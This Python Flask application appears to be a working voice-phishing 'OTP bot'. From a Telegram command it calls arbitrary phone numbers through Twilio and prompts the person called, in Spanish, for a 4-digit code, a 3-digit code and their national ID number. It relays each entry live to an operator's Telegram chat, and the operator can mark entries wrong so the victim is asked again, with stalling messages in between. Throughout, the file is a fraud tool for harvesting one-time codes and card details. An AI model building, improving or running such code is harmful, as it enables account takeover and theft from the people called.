from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
import requests
import threading
import time
import logging
import json
import os
from datetime import datetime
import flask
from dotenv import load_dotenv

load_dotenv()

# Configurar logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Añadir un manejador de archivo para registro persistente
if not os.path.exists('logs'):
    os.makedirs('logs')
file_handler = logging.FileHandler(f'logs/app_{datetime.now().strftime("%Y%m%d")}.log')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

app = Flask(__name__)

# ⚙️ Configuración desde variables de entorno
TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER')
YOUR_PHONE_NUMBER = os.getenv('YOUR_PHONE_NUMBER')

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Diccionario para almacenar sesiones de usuario
global_user_sessions = {}
processed_message_ids = set()

call_status_messages_sent = {}
call_final_states = {'completed', 'failed', 'busy', 'no-answer', 'canceled'}

# Variable para controlar el polling de Telegram
telegram_polling_active = False
last_update_id = 0
polling_lock = threading.Lock()

def absolute_url(path):
    """Genera una URL absoluta sin depender del contexto de solicitud."""
    if flask.has_request_context():
        base = request.url_root
    else:
        base = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        if not base.endswith('/'):
            base += '/'
    
    path = path.lstrip('/')
    full_url = base + path
    logger.info(f"🔗 URL generada: {full_url}")
    
    return full_url

# Funciones de persistencia de sesiones
def save_session_to_file(sessions_dict):
    """Guarda las sesiones en un archivo JSON para persistencia."""
    try:
        with open('sessions.json', 'w') as f:
            json.dump(sessions_dict, f)
            logger.info("📝 Sesiones guardadas en archivo")
    except Exception as e:
        logger.error(f"❌ Error al guardar sesiones: {e}")

def load_sessions_from_file():
    """Carga las sesiones desde un archivo JSON."""
    try:
        if os.path.exists('sessions.json'):
            with open('sessions.json', 'r') as f:
                sessions = json.load(f)
                logger.info(f"📂 Sesiones cargadas desde archivo: {len(sessions)} sesiones")
                return sessions
        else:
            logger.info("📂 No hay archivo de sesiones previo")
    except Exception as e:
        logger.error(f"❌ Error al cargar sesiones: {e}")
    return {}

# Cargar sesiones al inicio
global_user_sessions = load_sessions_from_file()

@app.route('/')
def index():
    return "Servidor de llamadas y verificación activo."

@app.route('/make-call')
def make_call():
    
    # Construir la URL correctamente
    base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
    url = f"{base_url}/step1"
    status_callback_url = f"{base_url}/call-status-callback"
    
    logger.info(f"📞 URL para la llamada: {url}")
    logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
    
    try:
        call = client.calls.create(
            to=YOUR_PHONE_NUMBER,
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )
        
        # Inicializar la sesión para el nuevo SID
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': YOUR_PHONE_NUMBER,
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # REMOVIDO: No incluir telegram_chat_id para llamadas manuales
        }
        save_session_to_file(global_user_sessions)
        
        # NUEVO: Marcar inmediatamente que enviamos el mensaje 'initiated' para evitar duplicados
        message_key = f"{call.sid}_initiated"
        call_status_messages_sent[message_key] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Notificar a Telegram
        send_to_telegram(f"🚀 <b>Llamada iniciada</b>\nSID: {call.sid}\nNúmero: {YOUR_PHONE_NUMBER}\nEstado: Iniciando...")
        
        logger.info(f"📞 Nueva llamada iniciada: SID={call.sid}")
        return jsonify({"status": "Llamada iniciada", "sid": call.sid})
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    

@app.route('/call-status-callback', methods=['POST'])
def call_status_callback():
    """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
    call_sid = request.values.get('CallSid')
    call_status = request.values.get('CallStatus')
    call_duration = request.values.get('CallDuration', '0')
    
    logger.info(f"📞 ACTUALIZACIÓN DE ESTADO DE LLAMADA: SID={call_sid}, Estado={call_status}, Duración={call_duration}s")
    
    # Verificar si existe la sesión para este SID
    if call_sid not in global_user_sessions:
        logger.warning(f"⚠️ Recibida actualización para SID desconocido: {call_sid}")
        global_user_sessions[call_sid] = {}
    
    # Obtener el estado anterior
    last_status = global_user_sessions[call_sid].get('call_status')
    
    # Solo procesar si el estado realmente cambió
    if call_status == last_status:
        logger.info(f"🔄 Estado duplicado ignorado para SID={call_sid}: {call_status}")
        return jsonify({"status": "ok"})
    
    # NUEVO: Control más estricto de duplicación con timestamp
    message_key = f"{call_sid}_{call_status}"
    current_time = datetime.now()
    
    # Si ya enviamos este mensaje en los últimos 30 segundos, no lo enviamos de nuevo
    if message_key in call_status_messages_sent:
        last_sent_time = datetime.strptime(call_status_messages_sent[message_key], "%Y-%m-%d %H:%M:%S")
        time_diff = (current_time - last_sent_time).total_seconds()
        if time_diff < 30:  # 30 segundos de protección
            logger.info(f"🚫 Mensaje de estado enviado hace {time_diff:.1f}s, ignorando duplicado: {call_sid}: {call_status}")
            return jsonify({"status": "ok"})
    
    # Guardar el estado y la hora de la actualización
    global_user_sessions[call_sid]['call_status'] = call_status
    global_user_sessions[call_sid]['last_update'] = current_time.strftime("%Y-%m-%d %H:%M:%S")
    global_user_sessions[call_sid]['call_duration'] = call_duration
    
    # Obtener el número de teléfono si existe
    to_number = global_user_sessions[call_sid].get('to_number', 'desconocido')
    
    # Guardar los cambios
    save_session_to_file(global_user_sessions)
    
    # Verificar si la llamada fue iniciada desde Telegram
    telegram_chat_id = global_user_sessions[call_sid].get('telegram_chat_id')
    
    # Marcar este mensaje como enviado con timestamp actual
    call_status_messages_sent[message_key] = current_time.strftime("%Y-%m-%d %H:%M:%S")
    
    # Limpiar mensajes antiguos del diccionario de control (mayores a 5 minutos)
    keys_to_remove = []
    for key, timestamp_str in call_status_messages_sent.items():
        try:
            msg_time = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
            if (current_time - msg_time).total_seconds() > 300:  # 5 minutos
                keys_to_remove.append(key)
        except:
            keys_to_remove.append(key)  # Eliminar entradas corruptas
    
    for key in keys_to_remove:
        call_status_messages_sent.pop(key, None)
    
    # Definir un icono según el estado
    status_icon = "📞"
    status_desc = "Estado actualizado"
    
    if call_status == "initiated":
        status_icon = "🔄"
        status_desc = "Llamada iniciada"
    elif call_status == "ringing":
        status_icon = "📳"
        status_desc = "Teléfono sonando"
    elif call_status == "in-progress":
        status_icon = "✅"
        status_desc = "Llamada contestada"
    elif call_status == "completed":
        status_icon = "🏁"
        status_desc = "Llamada finalizada"
    elif call_status == "busy":
        status_icon = "🔴"
        status_desc = "Número ocupado"
    elif call_status == "no-answer":
        status_icon = "❌"
        status_desc = "Sin respuesta"
    elif call_status == "failed":
        status_icon = "⚠️"
        status_desc = "Llamada fallida"
    elif call_status == "canceled":
        status_icon = "🚫"
        status_desc = "Llamada cancelada"
    
    # Crear mensaje de notificación
    message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
    
    # Añadir duración si está disponible y no es cero
    if call_status in ["completed"] and call_duration != '0':
        message += f"\nDuración: {call_duration}s"
    
    # NUEVO: Solo enviar a telegram general si NO fue iniciada desde Telegram
    if not telegram_chat_id:
        send_to_telegram(message)
        logger.info(f"📤 Mensaje enviado a Telegram general para SID: {call_sid}")
    else:
        logger.info(f"⏭️ Saltando Telegram general, llamada iniciada desde chat: {telegram_chat_id}")
    
    # Si hay un chat_id específico guardado, enviar también la notificación allí
    if telegram_chat_id:
        send_telegram_response(telegram_chat_id, message)
        logger.info(f"📤 Mensaje enviado a chat específico {telegram_chat_id} para SID: {call_sid}")
    
    # Si es un estado final, limpiar recursos relacionados con esta llamada
    if call_status in call_final_states:
        logger.info(f"🧹 Limpiando recursos para llamada finalizada: {call_sid}")
        keys_to_remove = [key for key in call_status_messages_sent.keys() if key.startswith(call_sid)]
        for key in keys_to_remove:
            call_status_messages_sent.pop(key, None)
    
    return jsonify({"status": "ok"})

@app.route('/step1', methods=['POST', 'GET'])
def step1():
    response = VoiceResponse()
    gather = Gather(num_digits=4, action='/save-step1', method='POST', timeout=20, finish_on_key='')
    gather.say("Por favor ingrese el código de verificación de 4 dígitos.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step1')
    return str(response)

@app.route('/save-step1', methods=['POST'])
def save_step1():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 1: CallSid={call_sid}, Digits={digits}")
    
    if not digits:
        return redirect_twiml('/step1')
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el nuevo código
    global_user_sessions[call_sid]['code4'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 4 dígitos: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Si estamos en revalidación, notificar a Telegram y esperar validación
    if is_revalidation:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Código de 4 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: continuar al siguiente paso
        response.say("Continuando.", language='es-ES')
        response.redirect('/step2')
    
    return str(response)

@app.route('/step2', methods=['POST', 'GET'])
def step2():
    response = VoiceResponse()
    gather = Gather(num_digits=3, action='/save-step2', method='POST', timeout=20, finish_on_key='')
    gather.say("Ahora ingrese el segundo código de 3 dígitos.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese los 3 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step2')
    return str(response)

@app.route('/save-step2', methods=['POST'])
def save_step2():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 2: CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el nuevo código
    global_user_sessions[call_sid]['code3'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 3 dígitos: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Si estamos en revalidación, notificar a Telegram y esperar validación
    if is_revalidation:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Código de 3 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: continuar al siguiente paso
        response.say("Continuando.", language='es-ES')
        response.redirect('/step3')
    
    return str(response)

@app.route('/step3', methods=['POST', 'GET'])
def step3():
    response = VoiceResponse()
    gather = Gather(num_digits=10, action='/save-step3', method='POST', timeout=30, finish_on_key='')
    gather.say("Por favor ingrese su número de cédula.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese su número de cédula de 10 o 7 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step3')
    return str(response)

@app.route('/save-step3', methods=['POST'])
def save_step3():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 3: CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el código (cédula)
    global_user_sessions[call_sid]['cedula'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")

    data = global_user_sessions[call_sid]
    logger.info(f"⚠️ DATOS COMPLETOS PARA SID={call_sid}: {data}")
    
    # REMOVIDO: Ya no necesitamos iniciar polling aquí porque está activo desde el inicio
    # El polling ya está corriendo y puede manejar tanto llamadas manuales como de Telegram
    
    response = VoiceResponse()
    response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
    
    # Verificar la longitud de los dígitos ingresados
    digit_length = len(digits)
    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
    
    # Agregar pausa de 3 segundos si son 7 dígitos
    if digit_length == 7:
        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
        response.pause(length=3)
    
    # Mensaje diferente dependiendo si es validación inicial o revalidación
    if is_revalidation:
        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
    else:
        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
    
    # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
    return str(response)

@app.route('/validate-result', methods=['GET', 'POST'])
def validate_result():
    call_sid = request.values.get('sid')
    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN PARA SID: {call_sid}")
    
    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
    if not call_sid and request.values.get('CallSid'):
        call_sid = request.values.get('CallSid')
        logger.info(f"📞 Usando CallSid del request: {call_sid}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el SID para validación")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si existe la clave 'validacion'
    validation = global_user_sessions.get(call_sid, {}).get('validacion')
    logger.info(f"⚠️ ESTADO DE VALIDACIÓN PARA SID={call_sid}: {validation}")

    response = VoiceResponse()

    # Si tenemos una validación
    if validation:
        logger.info(f"⚠️ VALIDACIÓN ENCONTRADA PARA SID={call_sid}: {validation}")
        
        # Resetear el contador de intentos ya que tenemos una validación
        count_key = f"{call_sid}_retry_count"
        if count_key in global_user_sessions.get(call_sid, {}):
            global_user_sessions[call_sid][count_key] = 0
            save_session_to_file(global_user_sessions)
        
        if validation == [1, 1, 1]:
            response.say("Verificación completada con éxito. Todos los datos son correctos. Gracias por su paciencia.", language='es-ES')
            return str(response)
        else:
            # Mensaje general cuando hay errores
            response.say("Hemos detectado algunos problemas con la información proporcionada.", language='es-ES')
            
            # Verificar qué código es incorrecto y redirigir
            if validation[0] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÓDIGO INCORRECTO PARA SID={call_sid}")
                response.say("El primer código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                response.redirect('/step1')
            elif validation[1] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO INCORRECTO PARA SID={call_sid}")
                response.say("El segundo código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                response.redirect('/step2')
            elif validation[2] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÉDULA INCORRECTA PARA SID={call_sid}")
                response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
                response.redirect('/step3')
            return str(response)
    else:
        # Añadimos un contador para evitar bucles infinitos
        count_key = f"{call_sid}_retry_count"
        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
        
        # Si llevamos más de 8 intentos, finalizamos la llamada
        if retry_count > 8:
            logger.warning(f"⚠️ DEMASIADOS INTENTOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
            return str(response)
        
        # Incrementar contador
        if call_sid in global_user_sessions:
            global_user_sessions[call_sid][count_key] = retry_count + 1
            save_session_to_file(global_user_sessions)
            logger.info(f"⚠️ ESPERANDO VALIDACIÓN PARA SID={call_sid}. INTENTO {retry_count + 1}")
        
        # Mensajes variados para que no suene repetitivo
        if retry_count % 3 == 0:
            response.say("Seguimos validando sus datos. Gracias por su paciencia.", language='es-ES')
        elif retry_count % 3 == 1:
            response.say("Continuamos con el proceso de verificación. Por favor espere un momento más.", language='es-ES')
        else:
            response.say("Sus datos están siendo procesados. La validación está en curso.", language='es-ES')
            
        # Añadir una pausa de 10 segundos entre mensajes de voz
        response.pause(length=10)
        
        # Verificar explícitamente si hay validación antes de continuar
        if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
            logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
            response.redirect(f"/validate-result?sid={call_sid}")
        else:
            response.redirect(f"/validate-result?sid={call_sid}")
    
    return str(response)

@app.route('/waiting-validation', methods=['POST', 'GET'])
def waiting_validation():
    """
    Ruta específica para mostrar un mensaje de espera mientras se validan los datos.
    """
    call_sid = request.values.get('CallSid')
    wait_time = int(request.values.get('wait', 10))
    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
    
    logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el CallSid para la espera de validación")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar inmediatamente si ya hay una validación
    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"⚠️ VALIDACIÓN YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion']}")
        response = VoiceResponse()
        response.redirect(f"/validate-result?sid={call_sid}")
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    response = VoiceResponse()
    
    # Añadir un mensaje personalizado de espera
    if is_revalidation:
        response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
    else:
        response.say("Estamos validando sus datos. Por favor espere unos momentos.", language='es-ES')
    
    # tiempo de pausa en segundos
    response.pause(length=10)
    
    # Redirigir a la verificación de resultados después de la espera
    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
        response.redirect(f"/validate-result?sid={call_sid}")
    else:
        response.redirect(f"/validate-result?sid={call_sid}")
    
    return str(response)

def redirect_twiml(url_path):
    """Atajo para redirección de Twilio."""
    response = VoiceResponse()
    response.redirect(url_path)
    return str(response)

def send_to_telegram(message):
    """Envía mensaje a Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    try:
        logger.info(f"⚠️ ENVIANDO MENSAJE A TELEGRAM: {message[:50]}...")
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA DE TELEGRAM: {response.status_code} - {response.text[:50]}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR A TELEGRAM: {e}")
        return None

def is_call_from_telegram(call_sid):
    """Verifica si una llamada fue iniciada desde Telegram."""
    return (call_sid in global_user_sessions and 
            'telegram_chat_id' in global_user_sessions[call_sid])

def send_telegram_response(chat_id, text):
    """Envía una respuesta directa a un chat de Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    try:
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA ENVIADA A TELEGRAM: {text[:50]}... - Status: {response.status_code}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR RESPUESTA A TELEGRAM: {e}")
        return None

# ----- FUNCIONALIDAD: POLLING DE TELEGRAM -----

def fetch_telegram_updates():
    """Obtiene actualizaciones de Telegram mediante el método getUpdates."""
    global last_update_id
    
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates'
    params = {'timeout': 30}
    
    if last_update_id > 0:
        params['offset'] = last_update_id + 1
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            updates = response.json()
            if updates.get('ok') and updates.get('result'):
                logger.info(f"📥 Recibidas {len(updates['result'])} actualizaciones de Telegram")
                return updates['result']
    except Exception as e:
        logger.error(f"❌ ERROR AL OBTENER ACTUALIZACIONES DE TELEGRAM: {e}")
    
    return []

def process_telegram_update(update):
    """Procesa una actualización de Telegram."""
    global last_update_id, processed_message_ids
    
    # Actualizar el último ID de actualización
    update_id = update.get('update_id', 0)
    if update_id > last_update_id:
        last_update_id = update_id
    
    # Procesar mensajes de texto
    if 'message' in update and 'text' in update['message']:
        chat_id = update['message']['chat']['id']
        message_text = update['message']['text']
        message_id = update['message']['message_id']
        
        # Control para evitar procesar mensajes duplicados
        if message_id in processed_message_ids:
            logger.info(f"🔄 Mensaje ya procesado, ID: {message_id}. Ignorando.")
            return
            
        # Añadir a mensajes procesados
        processed_message_ids.add(message_id)
        
        # Si el conjunto es demasiado grande, limpiar los más antiguos
        if len(processed_message_ids) > 100:
            processed_message_ids = set(list(processed_message_ids)[-50:])
        
        logger.info(f"📨 MENSAJE DE TELEGRAM RECIBIDO: {message_text}")
        
        # Procesar comando de llamada
        if message_text.startswith('/llamar') or message_text.startswith('llamar'):
            process_call_command(chat_id, message_text)
            return
        
        # Procesar comandos de validación
        if message_text.startswith('/validar') or message_text.startswith('validar'):
            parts = message_text.split()
            
            if len(parts) >= 5:
                sid = parts[1]
                try:
                    vals = list(map(int, parts[2:5]))
                    
                    # Asegurar que la sesión existe para este SID
                    if sid not in global_user_sessions:
                        global_user_sessions[sid] = {}
                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_telegram_update")
                    
                    # Restablecer contador de intentos si existe
                    count_key = f"{sid}_retry_count"
                    if count_key in global_user_sessions[sid]:
                        global_user_sessions[sid][count_key] = 0
                        logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
                    
                    # Guardar la validación
                    global_user_sessions[sid]['validacion'] = vals
                    save_session_to_file(global_user_sessions)
                    
                    logger.info(f"✅ VALIDACIÓN GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                    
                    # Confirmar al usuario de Telegram
                    send_telegram_response(chat_id, f"<b>✅ Validación guardada para {sid}:</b> {vals}")
                except Exception as e:
                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN TELEGRAM: {e}")
                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
            else:
                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")

def process_call_command(chat_id, message_text):
    """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
    parts = message_text.split()
    
    # Verificar formato correcto: /llamar +123456789
    if len(parts) < 2:
        send_telegram_response(chat_id, "❌ <b>Formato incorrecto.</b> Usar: /llamar +NÚMERO_TELÉFONO")
        return False
    
    # Extraer número de teléfono
    phone_number = parts[1]
    
    # Validación básica del número de teléfono
    if not (phone_number.startswith('+') and len(phone_number) > 8):
        send_telegram_response(chat_id, "❌ <b>Formato de número inválido.</b> Debe comenzar con + y tener al menos 8 dígitos.")
        return False
    
    # Iniciar polling de Telegram si no está activo (igual que en make_call)
    start_telegram_polling()
    
    try:
        # Usar la misma lógica que make_call para construir URLs
        base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        url = f"{base_url}/step1"
        status_callback_url = f"{base_url}/call-status-callback"
        
        logger.info(f"📞 URL para la llamada: {url}")
        logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
        
        # Hacer la llamada usando EXACTAMENTE la misma configuración que make_call
        call = client.calls.create(
            to=phone_number,  # Solo cambiar el número de destino
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )
        
        # Inicializar la sesión EXACTAMENTE como en make_call, pero agregando telegram_chat_id
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': phone_number,  # Usar el número del comando en lugar de YOUR_PHONE_NUMBER
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'telegram_chat_id': chat_id  # Agregar el chat_id para respuestas específicas
        }
        save_session_to_file(global_user_sessions)
        
        # Notificar a Telegram IGUAL que make_call pero personalizado
        send_to_telegram(f"🚀 <b>Llamada iniciada desde Telegram</b>\nSID: {call.sid}\nNúmero: {phone_number}\nEstado: Iniciando...")
        
        # También enviar respuesta directa al usuario que pidió la llamada
        send_telegram_response(chat_id, f"🚀 <b>Llamada iniciada</b>\nNúmero: {phone_number}\nSID: {call.sid}")
        
        logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}")
        return True
        
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
        send_telegram_response(chat_id, f"❌ <b>Error al iniciar llamada:</b> {str(e)}")
        return False

def telegram_polling_worker():
    """Worker para el polling de Telegram en segundo plano."""
    global telegram_polling_active
    
    logger.info("🔄 Iniciando polling de Telegram...")
    
    while telegram_polling_active:
        try:
            updates = fetch_telegram_updates()
            for update in updates:
                process_telegram_update(update)
        except Exception as e:
            logger.error(f"❌ ERROR EN EL WORKER DE POLLING: {e}")
        
        time.sleep(1)
    
    logger.info("🛑 Polling de Telegram detenido")

def start_telegram_polling():
    """Inicia el polling de Telegram si no está ya activo."""
    global telegram_polling_active
    
    with polling_lock:  # NUEVO: Usar lock para thread safety
        if not telegram_polling_active:
            telegram_polling_active = True
            threading.Thread(target=telegram_polling_worker, daemon=True).start()
            logger.info("🚀 Thread de polling de Telegram iniciado")
            return True
        else:
            logger.info("⚠️ Polling de Telegram ya está activo")
            return False

